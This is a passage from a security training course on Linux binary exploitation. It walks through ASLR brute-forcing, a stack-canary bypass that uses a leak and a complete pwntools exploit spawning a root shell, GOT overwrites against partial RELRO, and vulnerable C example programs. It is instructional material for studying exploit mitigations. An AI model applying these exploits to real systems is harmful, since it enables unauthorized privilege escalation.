exploit without the address values looks like the following.
2.3.2 ASLR Bypass Example
|  p.91
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s run the target binary in gdb to get the libc address and 
the offset. As we said, we will grab any libc valid base 
address for the purpose of running the exploit multiple 
times until the same base address is hit again.
2.3.2 ASLR Bypass Example
|  p.92
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Using the „p” command, we display the addresses of 
interesting functions and then calculate the offsets, as 
follows.
2.3.2 ASLR Bypass Example
|  p.93
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We can do the same with the string „/bin/sh” that resides in 
libc.
2.3.2 ASLR Bypass Example
|  p.94
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We now have all offsets. Let’s also run the target binary 
outside of gdb using ldd to see if libc is really loading at 
that address that was found inside gdb.
2.3.2 ASLR Bypass Example
|  p.95
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
It seems that for the purpose of libc base guessing, we 
need to use an address format of 0xb7dXX000. Let’s add all
of this information to the exploit. We will choose a random 
replacement for the XX’s (“cc” in this case).
2.3.2 ASLR Bypass Example
|  p.96
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Now, let’s implement the guessing logic. 
As previously mentioned, instead of dynamically changing 
the address within the exploit, we will just run it until libc 
meets our hardcoded address. We can use a bash loop for 
this. 
2.3.2 ASLR Bypass Example
|  p.97
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Also, as we are spawning a shell from the exploit, we will 
need to use the cat trick in order to interact with it. 
However, this would require us to press enter on each 
attempt. Luckily, we can modify the exploit, so that we will 
see some commands being executed when the proper 
address is guessed, as follows.
(cat exploit.txt; echo id; echo ls) | ./vulnerable
|  p.98
2.3.2 ASLR Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s also wrap it up in an infinite loop. We need to 
eliminate the binary output for clarity, which can be 
achieved using grep. 
while true; do (cat exploit.txt; echo id; echo ls) | ./vulnerable 
| grep „uid” –A 10; done
|  p.99
2.3.2 ASLR Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
After a while of not displaying anything, we suddenly get the 
output of the id and ls commands. In order to stop the loop, 
Ctrl+C needs to be pressed multiple times.
2.3.2 ASLR Bypass Example
|  p.100
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We have successfully performed a ret2libc-style attack with 
ASLR turned on. 
Low randomization entropy allowed us to successfully
guess the libc base address.
2.3.2 ASLR Bypass Example
|  p.101
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. 
|  p.102
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
2.4
Stack Cookie
|  p.103
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Another exploit mitigation that is employed on Linux 
systems is Stack Cookie, which is also known as stack 
canary, stack protector, stack guard or SSP.
Stack canary is a 4-byte value that is pushed onto the stack 
when a function is entered. When the function ends its task, 
and the stack frame is cleared, the stack cookie value is 
checked against the previously pushed value. If it’s 
different, the program is terminated by calling the
__stack_chk_fail function.
2.4 Stack Cookie
|  p.104
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
https://ocw.cs.pub.ro/courses/_media/cns/labs/stack_canary_illustration.png?w=
500&tok=eb1cc3
The image on the left shows 
the stack layout when a
canary is implemented. Below, 
you can see the error 
message displayed when a
canary protection is triggered.
2.4 Stack Cookie
|  p.105
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The stack cookie can be one of the following types:
•
Random Canary – is a 4-byte value generated by e.g. 
/dev/random. 
•
Random XOR Canary – the random canary is additionally 
XOR’ed with stored control data.
•
Null canary – the canary has a value of 0x00000000; 
supposedly, it will be impossible to deliver zeroes to the 
stack as it’s a null terminator for strings.
•
Terminator canary – the canary is set to a combination of 
string terminators like 0x00, 0xff, 0x0a, and 0x0d.
2.4 Stack Cookie
|  p.106
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Of course, there could be custom implementations, but they 
are not likely to be more effective. 
For example, on a custom implementation it is possible that 
the cookie value is hardcoded in a variable. This value can 
be easily obtained during reverse-engineering the target 
binary.
2.4 Stack Cookie
|  p.107
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Signs that a stack canary is being used are:
• “Stack smashing detected” displayed at an overflow 
attempt
• Calls to __stack_chk_fail or similar functions in the 
disassembly
2.4 Stack Cookie
|  p.108
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
-fstack-protector-all
To compile a binary with a Stack Guard using gcc, add the 
following flag to the compilation process:
|  p.109
2.4 Stack Cookie
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
There is no universal way to bypass the stack canary 
protection. Often, creativity might allow you to turn an 
unexploitable crash into code execution and a stack canary 
bypass. 
However, there are some generic approaches to this. 
2.4.1 Bypassing Stack Cookie
|  p.110
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In order to bypass a canary protection, you should be able to 
answer following questions first:
•
What is the value of the canary? Is it different for each run of 
the program? Try to spot it each time in the dbg and note its 
value. 
•
What type of canary is it? Use the types presented earlier to 
categorize the canary you are dealing with.
•
What function in the program is vulnerable? What are the 
allowed characters? 
•
Is it possible to exploit the vulnerability before the function 
returns? 
•
Is the exploit remote or local? Can we bruteforce the canary?
2.4.1 Bypassing Stack Cookie
|  p.111
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Upon figuring out what type of canary you are dealing with 
you might come up with an idea on how to beat it. 
The most common approach is brute-forcing the canary, 
which means running the exploit multiple times where the 
payload’s cookie part will be randomized. Other common 
techniques involve information leakages, like ret2write or 
format string exploits.
2.4.1 Bypassing Stack Cookie
|  p.112
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We will use a practical example to show how a stack canary 
bypass might look like. We will use Ubuntu 18 64-bit, a 32-
bit vulnerable application and the python pwntools.
Despite the 64-bit system, the debugging will not be 
different from the previous examples since the binary is 32-
bit.
2.4.2 Stack Cookie Bypass Example
|  p.113
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Python Pwntools is a collection of python modules that are
commonly used in the CTF binary exploitation challenges. You 
can find the installation instructions on its github page. 
https://github.com/Gallopsled/pwntools.
The installation is done using apt and pip.
apt-get update 
apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 
pip install --upgrade pip 
pip install --upgrade pwntools
|  p.114
2.4.2 Stack Cookie Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Complete documentation can be found on the following
website: http://docs.pwntools.com/en/stable/
So far, we created very straightforward exploits that can be 
written in one line of text (e.g. pasted to the program’s 
STDIN or fed using the cat command).
2.4.2 Stack Cookie Bypass Example
|  p.115
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
However, more complex exploits require multiple 
interactions with the target binary. For example, there could 
be a menu within the application that requires multiple 
choices, and your input depends on the data returned by the 
application. 
In that case, it is difficult to react to an application’s input 
dynamically, especially if we want to input some non-ASCII 
characters into the application.
2.4.2 Stack Cookie Bypass Example
|  p.116
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Pwntools is the answer for such issues as it allows us to 
run a binary and interact with its output using python 
scripts.
Moreover, it contains a convenient interactive() function 
that allows it to interact with a spawned shell without using 
multiple cat commands.
2.4.2 Stack Cookie Bypass Example
|  p.117
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We will use pwntools in the following example, where we 
will exploit a vulnerable binary that is protected with a stack 
canary.
The stack canary is random for each run of the program.
We will utilize an information leak vulnerability in order to 
get the canary and then dynamically append it to our
overflow payload.
2.4.2 Stack Cookie Bypass Example
|  p.118
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
As the overflow payload will contain the correct canary and 
it will place it in the proper place on the stack, there will be 
no call to __stack_chk_fail and the execution will continue,
resulting in the possibility of an EIP overwrite.
2.4.2 Stack Cookie Bypass Example
|  p.119
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Consider the following source code.
•
The getshell() function spawns a root 
shell. Unfortunately, it is a dead code.
•
The init() function clears all buffers 
related to the I/O operations. Its 
purpose is not to store any unwanted 
data in memory.
•
The application also performs two 
read operations followed by printing 
what was just read. It should be 
mentioned that the read() function 
does not stop on a null-byte.
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
setuid(0);
system("/bin/sh");
}
void init() {
setbuf(stdin, NULL);
setbuf(stdout, NULL);
setbuf(stderr, NULL);
}
void vuln() {
char buf[100];
for(int i=0;i<2;i++){
read(0, buf, 0x200);
printf(buf);
}
}
int main(void) {
init();
puts("Hello Hacker!");
vuln ();
return 0;
}
|  p.120
2.4.2 Stack Cookie Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The application will be compiled on the Ubuntu 18 x64 with following command:
gcc -m32 -no-pie canary.c -o canary
|  p.121
2.4.2 Stack Cookie Bypass Example
•
-m32 instructs the compiler to create a 32-bit executable.
•
-no-pie turns off the Position Independent Executable mitigation. This mitigation 
will be explained later in the course. For now, you should know that it is enabled 
by default on modern Ubuntu and when used, it will completely change the 
addressing within the executable.
•
For the purpose of this example, we will not make the binary SUID root until the 
end of the debugging process, so we can conveniently make use of the core 
dump files.
•
The stack canary protection is added by default, as well as the NX and the ASLR
ones, which are present on the system. 
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The vulnerability in the program can be spotted by just 
looking at the source code:
Here, 100 bytes are allocated for a variable and then the 
program allows reading 200 bytes of data from STDIN to 
that variable. Obviously, that’s a stack overflow.
void vuln() {
char buf[100];
for(int i=0;i<2;i++){
read(0, buf, 0x200);
printf(buf);
}
|  p.122
2.4.2 Stack Cookie Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
However, if we try to input an overly long buffer, the stack 
canary protection disallows further execution.
2.4.2 Stack Cookie Bypass Example
|  p.123
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s enter the gdb and disas the vuln() function. Can you 
spot the code that was added by the compiler?
We can see that after the printf function, a value is taken 
from ebp-0xc. It is then XOR’ed with a value from the
gs:0x14 address. GS is a segment register in which the 
value cannot be obtained directly from gdb, so we cannot 
know the value of the cookie yet.
2.4.2 Stack Cookie Bypass Example
|  p.124
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
After the XOR operation, there is a je operation. As the jump 
assembly instruction relies on flags, if the zero flag value is 
zero then execution continues, otherwise __stack_chk_fail 
is called. Additionally, zero flag is set to zero when the XOR 
operation returns zero, which can be achieved only if the 
values from ebp-0xc and gs:0x14 are equal.
In other words, this piece of code is responsible for 
checking if the stack canary was modified.
2.4.2 Stack Cookie Bypass Example
|  p.125
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s set a breakpoint on the nop instruction before the 
canary is checked and run the program in a legitimate way.
2.4.2 Stack Cookie Bypass Example
|  p.126
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We see that some memory output is printed instead of our 
buffer. Apart from that, the execution stops at the desired 
breakpoint.
2.4.2 Stack Cookie Bypass Example
|  p.127
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s examine the location of ebp – 0xc:
2.4.2 Stack Cookie Bypass Example
|  p.128
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Indeed a canary is present, and it is null-terminated. 
The current value is 0xfd378500, but in each subsequent 
run it will be different, apart from the zeros at the end which 
work as a null-terminator.
2.4.2 Stack Cookie Bypass Example
|  p.129
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
If we examine the larger area around ebp, we see that the 
canary lies in the buffer that we are able to overflow.
2.4.2 Stack Cookie Bypass Example
|  p.130
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Let’s use that breakpoint to see what the offset to 
overwriting the canary is. We will use the pattern create 
utility to do so.
2.4.2 Stack Cookie Bypass Example
|  p.131
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
As we hit the breakpoint, we can examine the cookie 
location at ebp – 0xc to figure out that the cookie starts to 
be overwritten after 100 bytes of the user buffer.
2.4.2 Stack Cookie Bypass Example
|  p.132
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We can instantly check the offset to the EIP. Let’s use the 
stepi instructions until the code stops at __stack_chk_fail. 
We see that the first instruction after __stack_chk_fail is at 
address 0x80486ce.
2.4.2 Stack Cookie Bypass Example
|  p.133
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We can change the EIP value so that it points to another 
instruction like there was no stack canary check, and 
continue the execution in order to achieve a segfault.
2.4.2 Stack Cookie Bypass Example
|  p.134
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We now know that the canary is overwritten after 100 bytes 
of user input. Let’s generate a 100 byte string and copy it. 
Later it will be fed into the application. We will also set a 
breakpoint on the nop before the canary check.
2.4.2 Stack Cookie Bypass Example
|  p.135
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
After pasting the second input of 100 „A”’s, the execution 
stops at the breakpoint. We also see that some data was 
printed out apart from the „A”’s. What is that?
There is another thing that you should know; when using a 
read function with stdin, once you press enter after your 
input, a newline (0x0a) character is appended to the stdin 
buffer. You should thus expect that there were 100 A’s and 
a newline sent to the application.
2.4.2 Stack Cookie Bypass Example
|  p.136
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
As we examine the known canary location and some bytes 
before it, we can see that our buffer stops exactly before 
the canary with one difference; it does not end with 0x00 
anymore, but with 0x0a – which, as previously mentioned, 
is appended to the user’s buffer.
2.4.2 Stack Cookie Bypass Example
|  p.137
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We can confirm that the canary is correct by changing the 
last byte of the canary to 0x00 and allowing the execution, 
as follows.
2.4.2 Stack Cookie Bypass Example
|  p.138
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The canary is now proven to be vulnerable to information
leakage. 
Let’s restart the 
application in the 
debugger and this 
time set a breakpoint 
at the printf call within 
the vuln() function.
2.4.2 Stack Cookie Bypass Example
|  p.139
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Again we generate 100 „A”’s and paste it to the program so 
that the breakpoint at printf is hit.
Let’s examine the stack as it should contain the argument 
for the printf call – a pointer to a string that should be 
printed out.
2.4.2 Stack Cookie Bypass Example
|  p.140
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Once given the pointer to the string, printf starts to put the 
bytes into the stdout one by one, until it encounters a null-
terminator. 
In this case, we overwrote a null terminator which was at 
the end of the canary with a 0x0a character that was 
appended to our buffer. 
2.4.2 Stack Cookie Bypass Example
|  p.141
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Thus, the garbage characters at the end of the user buffer 
contain the current stack canary. The printed string is 
terminated only at the point where the first null byte resides, 
which will be at the address that holds the value 
0x0804a000.
2.4.2 Stack Cookie Bypass Example
|  p.142
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Moreover, as we have two chances to write and read to the 
buffer, it becomes obvious that we can leak the canary at 
the first write without causing an overflow, and as we know 
the correct value of it, we can use it to cause a legitimate 
overflow with a valid canary in order to take control over the 
return address and set the EIP to an arbitrary value.
2.4.2 Stack Cookie Bypass Example
|  p.143
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
As a function that spawns a shell is present within the 
binary, setting the EIP to its address will be enough to 
successfully exploit the binary.
The last thing that is missing is to create an exploit is the 
ability to dynamically read the application’s output and 
convert the leaked cookie data into the second input. 
2.4.2 Stack Cookie Bypass Example
|  p.144
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
For that purpose, we will use pwntools. 
We also need to grab the target function address –
0x080485d6, as follows.
2.4.2 Stack Cookie Bypass Example
|  p.145
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
First, we import the pwntools and struct modules. We can 
hardcode the getshell function address. Using pwn’s 
process and recvuntil utilities, we start the target 
application and receive its output until the string „Hello 
Hacker!” is met.
The send/recv functions of 
pwntools work in a similar 
way as the socket send/recv 
functions in Python.
2.4.2 Stack Cookie Bypass Example
|  p.146
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In the next part, we send 100 A’s to the binary and then 
receive its output in two portions. The first is our buffer that 
is sent back, and the second is the next 4 bytes. 
It is also immediately unpacked 
to a regular byte order using the 
u32() function. The canary is 
then printed out.
2.4.2 Stack Cookie Bypass Example
|  p.147
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The last step takes the retrieved canary value and packs it 
back to memory byte order using the reverse of the u32()
function, named p23(). 
The same effect can be achieved using struct.pack. The 
offsets are based on our previous discovery using the
pattern.
2.4.2 Stack Cookie Bypass Example
|  p.148
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The interactive() function allows us to interact with the 
underlying shell in case it is spawned. If it is not, you might 
get various errors that will end in a segmentation fault.
Let’s make the binary setuid root for proof of concept
creation purposes.
2.4.2 Stack Cookie Bypass Example
|  p.149
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Running the exploit results in a root shell.
2.4.2 Stack Cookie Bypass Example
|  p.150
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The full exploit code can be 
seen on the right. 
The walkthrough is based on 
https://ctf-wiki.github.io/ctf-
wiki/pwn/linux/mitigation/can
ary/, which also contains other 
interesting binary exploitation 
techniques.
from pwn import *
import struct
get_shell = "\xd6\x85\x04\x08" 
exploit = process("./canary")
exploit.recvuntil("Hello Hacker!")
#First write - leak the canary
payload = "A"*100
exploit.sendline(payload)
exploit.recvuntil("A"* 100)
Canary = u32(exploit.recv(4))-0xa
log.info("Canary:"+hex(Canary))
#Second write - stack overflow
payload = "A"*100 + p32(Canary) + "A"*12 + 
get_shell
exploit.send(payload)
exploit.recv ()
exploit.interactive ()
|  p.151
2.4.2 Stack Cookie Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The previous example also allowed us to bypass both ASLR 
and NX. This is because we used a ret2function-style 
attack, so the non-executable stack didn’t matter.
Also, we operated on addresses coming from a non-
randomized area, thus ASLR was not an issue in this case.
2.4.2 Stack Cookie Bypass Example
|  p.152
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
2.5
RELRO
|  p.153
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
https://medium.com/@HockeyInJune/relro-relocation-read-only-c8d0933faef3
RELRO stands for RELocation Read Only. 
It’s an exploit mitigation that protects data sections of a 
process from overwriting during an exploitation process. 
2.5 RELRO
|  p.154
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
A dynamically linked ELF binary contains the Global Offset Table 
(GOT) in order to dynamically resolve functions located in shared 
libraries. 
The process of resolving the function address is similar to the 
below:
•
Call to functions actually points to PLT (Procedure Linkage 
Table) in the .plt section.
•
PLT points to a function address in GOT. GOT is actually 
residing in the .plt.got section.
•
GOT contains pointers back to PLT, where the final address of 
the function is stored.
2.5 RELRO
|  p.155
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The purpose of resolving symbols that are about to be 
used, is a performance enhancement. We resolve only 
functions that are used during runtime, as not all the 
functions (.got and .got.plt) should be writable.
In case the attacker is able to perform an arbitrary write of 
just 4 bytes, he can hijack the global offset table and 
change the address of a resolved function (e.g.- exit) to 
point to the location where the shellcode is stored.
2.5 RELRO
|  p.156
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
What’s the role of RELRO in all of this? There are two stages of 
RELRO – partial and full.
•
Partial RELRO that maps a .got section as read-only 
•
.got.plt is still writable
With Partial RELRO, exploitation of arbitrary write is still possible.
Partial RELRO can be forced during compilation using the below 
gcc arguments.
-Wl,-z,relro
|  p.157
2.5 RELRO
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Full RELRO does the same as partial, plus it has some additional 
protections:
•
The linker will perform all the symbol lookups at link time 
(before execution starts) and then it will remove the write 
permissions from the GOT.
•
.got.plt becomes part of .got.
In order to force full RELRO, additional arguments have to be 
supplied to gcc, as follows.
-Wl,-z,relro,-z,now
|  p.158
2.5 RELRO
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
With full RELRO, exploitation of an arbitrary write is not 
possible – at least not by overwriting GOT entries. There 
can still be other conditions in the target binary that might 
be exploitable in an unconventional, creative way!
Additionally, there is no direct RELRO bypass. However, the 
price of weaker performance is often too high for the 
developers to implement FULL RELRO in binaries. Full 
RELRO, once spotted, informs you that you cannot 
overwrite GOT/PLT entries.
2.5 RELRO
|  p.159
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
However, if there is no full RELRO, you are free to exploit the
arbitrary write vulnerabilities. These are also called write4
vulnerabilities.
As previously mentioned, GOT and PLT are used by the 
application for resolving function locations. If we are able 
to overwrite those areas, it will be possible to execute a 
different function than the program intended to. For 
example, system instead of printf.
2.5.1 Bypassing RELRO
|  p.160
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Arbitrary writes are rarely standalone vulnerabilities, rather 
they are spotted as vulnerable conditions, often called 
write-what-where, which means that we control what to 
write and where to write it. 
Such vulnerabilities are often spotted in operating system 
kernels; however, we will exploit those conditions on the 
application level.
2.5.1 Bypassing RELRO
|  p.161
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In order to explain the mechanics of the write-what-where 
condition, we will use a training/example application. Such 
code can not be spotted as a standalone application, but 
we will exploit a similar condition later in the course. Thus, 
it is important to know how to abuse writable PLT/GOT.
We will compile the binary with the default gcc options on 
Ubuntu 16 x86; during the exploitation, ASLR is disabled on 
the system.
2.5.2 RELRO Bypass Example
|  p.162
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The program makes use of 
command line arguments. It takes 
the first one and saves it in 
memory as an address (where to 
write). 
Next, the second one is copied to 
that address (what to write).
There is no overflow vulnerability 
as strncpy is used, which uses a 
strong length as an argument. 
This prevents the user from
writing more data than expected 
to a four byte-wide variable.
//got.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{
char *pointer[4];
char second[4];
strncpy(pointer, argv[1], 4);
printf("Ptr points to %p\n",  *pointer);
printf("Now we will copy the argv[2]: %s 
to the location: %p\n", argv[2], *pointer);
strncpy(*pointer, argv[2], 4);
printf("sh");
return EXIT_SUCCESS;
}
|  p.163
2.5.2 RELRO Bypass Example
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The compiler throws some warnings but it successfully 
manages to create an executable.
2.5.2 RELRO Bypass Example
|  p.164
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
When examining the binary with checksec, we can see that 
partial RELRO is enabled. Thus, we should have no 
difficulties exploiting an arbitrary write.
2.5.2 RELRO Bypass Example
|  p.165
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
If we try to run the program with two random arguments, it 
throws a segmentation fault, which is not surprising as we 
are trying to copy something into a non-existing address.
2.5.2 RELRO Bypass Example
|  p.166
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
How can we exploit this situation? Let’s analyze the source 
code. Also, we have already placed a helper in the last 
function that might serve as a hint. Let’s run the application 
and set a breakpoint on the strncpy function. 
2.5.2 RELRO Bypass Example
|  p.167
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Then, we’ll continue two times until we reach the second 
strncpy, just before segfault. By examining the stack we 
can indeed observe how the program is trying to write to 
0x41414141.
2.5.2 RELRO Bypass Example
|  p.168
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In this case, we can write any value of 4 bytes to any 
location. We cannot overwrite the EIP directly, but we can 
try to overwrite an address of the existing legitimate 
function. Let’s take a look at the disassembly of the main() 
function.
2.5.2 RELRO Bypass Example
|  p.169
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
There is another printf() call after the vulnerable strncpy operation. 
Furthermore, the string „sh” to be printed is pushed onto the stack right 
before it. Can we change the „printf” to „system” somehow?
The answer is yes, but not directly. The program is calling the function 
at location 0x8048350 in the PLT, which turns out to be read/execute 
only. We cannot write to that location.
2.5.2 RELRO Bypass Example
|  p.170
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
However, if we disassemble that location, we can see that it 
is a function stub, and shortly after the first instruction a 
jump is made.
2.5.2 RELRO Bypass Example
|  p.171
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Checking vmmap confirms that this location is writable. 
Using readelf –S, we also see that the abovementioned
area belongs to the .got.plt section.
2.5.2 RELRO Bypass Example
|  p.172
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
In this case, the function stub points to .GOT.PLT. If there 
was no RELRO at all, it would be in the .GOT section.
In both cases we can abuse the address pointed by the
function stub during exploitation of the arbitrary write 
condition.
2.5.2 RELRO Bypass Example
|  p.173
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The last thing we need to do is get the address of system(). 
It can be done within gdb, as usual.
2.5.2 RELRO Bypass Example
|  p.174
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We can then overwrite the .GOT.PLT entry with the address 
of system(). Keep in mind, that there could be an alternative 
solution – supplying the address of shellcode (stored on 
the stack). However, both of those solutions are applicable 
only when ASLR is not in place.
Of course, in the current scenario there is a helper on the 
stack – a „sh” string. If it was not here, the exploitation 
would be more difficult and would require returning to 
shellcode.
2.5.2 RELRO Bypass Example
|  p.175
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We are overwriting the .GOT.PLT entry with the address of 
system(). We can hardcode the system() address as this
time we are not dealing with ASLR.
Let’s prepare the exploit to overwrite printf().
2.5.2 RELRO Bypass Example
|  p.176
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
We need to remember the reverse byte order. Apart from 
that, the exploit is rather straightforward. The first 
argument is the address of print, and the second is the 
address of system.
If you lose the address of printf, 
you can obtain it using the
objdump tool, as follows.
2.5.2 RELRO Bypass Example
|  p.177
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
The exploit allows us to spawn a shell. As it was not a SUID 
binary, we are still operating with the current user’s 
permissions.
2.5.2 RELRO Bypass Example
|  p.178
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
2.6
Other Protections
|  p.179
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
There are more exploit protections employed on Linux 
systems, that are not presented in this course. Some of 
them require complex and advanced exploits to be 
bypassed
However, we will soon present what those protections are, 
without an in-depth technical explanation. 
2.6 Other Protections
|  p.180
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
RPATH – rather than an exploit protection, this is an executable’s 
attribute; however, it is checked by checksec.sh so it is worth 
mentioning. 
If RPATH is set, then it can specify a path from which a library 
can be included. The path is hardcoded, and the libraries 
included do not drop the potential SUID privileges. If the location 
hardcoded in RPATH is writable, we can try to put there a crafted 
shared library (like libc) and wait for the program to load it. Such 
library might subvert legitimate functionalities, for example, a 
strcmp() implementation that spawns a shell.
2.6 Other Protections
|  p.181
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
PIE (Positon Independent Executable), also known as 
Position Independent Code, is a stronger version of ASLR. 
Despite what ASLR does, PIE randomizes Code and 
GOT/PLT segments. 
In order to beat PIE, complex exploits utilizing memory 
leaks needs to be used in order to obtain any reliable 
addresses within the attacked executable. Furthermore, 
relative offsets should be used to locate strategic areas of 
the executable and possibly exploit it.
2.6 Other Protections
|  p.182
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
ASCII Armor – maps Library addresses to memory 
addresses that contain null bytes. 
It utilizes the fact that shipping zero’s within an attacker 
buffer is often a problem.
2.6 Other Protections
|  p.183
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
Most exploit protections alone are weak, but when used 
together they make the exploitation process difficult.
On the other hand, employing exploit protections often 
decreases the performance of a program or increases it’s 
complexity. That’s why lots of applications are still 
vulnerable.
2.6 Other Protections
|  p.184
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
You can practice binary exploitation on Linux by studying 
CTF challenges. As the difficulty increases each year, you 
might want to start from the earliest ones and then trying to 
solve more modern ones.
Here is an interesting github repository to practice. 
https://github.com/ctfs
2.6 Other Protections
|  p.185
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
References
|  p.186
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
References
Checksec.sh
Exploit Mitigation Techniques - Data Execution Prevention (DEP)
Linux and ASLR: kernel/randomize_va_space
Simple ASLR/NX bypass on a Linux 32 bit binary
https://github.com/slimm609/checksec.sh
https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634
https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/
https://decoder.cloud/2017/06/15/simple-aslrnx-bypass-on-a-linux-32-bit-binary/
|  p.187
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
References
Bypassing ASLR Protection using Brute Force
Gallopsled/pwntools
pwntools
RELRO: RELocation Read-Only
https://hacked0x90.wordpress.com/2016/10/30/bypassing-aslr-protection-using-brute-force/
https://github.com/Gallopsled/pwntools
http://docs.pwntools.com/en/stable/
https://medium.com/@HockeyInJune/relro-relocation-read-only-c8d0933faef3
|  p.188
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
References
PoliCTF 2015: John's Shuffle
CTFs
Shellcoder’s handbook
https://github.com/ctfs/write-ups-2015/tree/master/polictf-2015/pwnable/johns-shuffle 
https://github.com/ctfs
http://phrack.org/issues/56/5.html#article
https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-
Security/dp/047008023X 
|  p.189
Bypassing stackguard and stackshield 
XDSv1: Section 1, Module 2 - Caendra Inc. © 2019
References
Hacking: The Art of Exploitation
CSC 591 Systems Attacks and Defenses Stack Canaries & ASLR
Exploit Mitigation Techniques - Stack Canaries
Lab 08 - Exploit Protection Mechanisms
https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson-ebook/dp/B004OEJN3I
